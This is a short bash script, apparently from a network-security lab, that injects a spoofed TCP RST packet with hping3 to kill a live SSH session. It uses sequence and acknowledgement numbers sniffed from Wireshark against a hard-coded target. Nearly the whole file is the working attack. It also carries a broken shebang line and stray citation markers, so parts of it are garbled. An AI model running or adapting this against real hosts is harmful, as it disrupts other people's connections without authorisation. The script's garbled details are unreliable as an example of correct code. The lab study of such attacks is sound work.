#!/binbin/bash
#
# TCP RST ATTACK SCRIPT (SSH)
# Fires a single, spoofed TCP RST packet to kill an SSH session.
# Based on the lab procedure from Q7[cite: 2384].
#

# --- Values sniffed from Wireshark in the lab [cite: 2421, 2442] ---
TARGET_IP="44.65.10.55"
TARGET_PORT=22
SOURCE_PORT=49618
SEQ_NUM=1011903400
ACK_NUM=2921787967
# ----------------------------------------------------

echo "Injecting spoofed TCP RST packet to kill SSH session on $TARGET_IP..."

# This command sends a packet with the RST (-R) and ACK (-A) flags set,
# using the exact sequence (-M) and ack (-L) numbers from the live session.
sudo hping3 $TARGET_IP \
    -p $TARGET_PORT \
    -s $SOURCE_PORT \
    -A -R \
    -M $SEQ_NUM \
    -L $ACK_NUM \
    -c 1

echo "Attack packet sent. The SSH connection should be terminated."
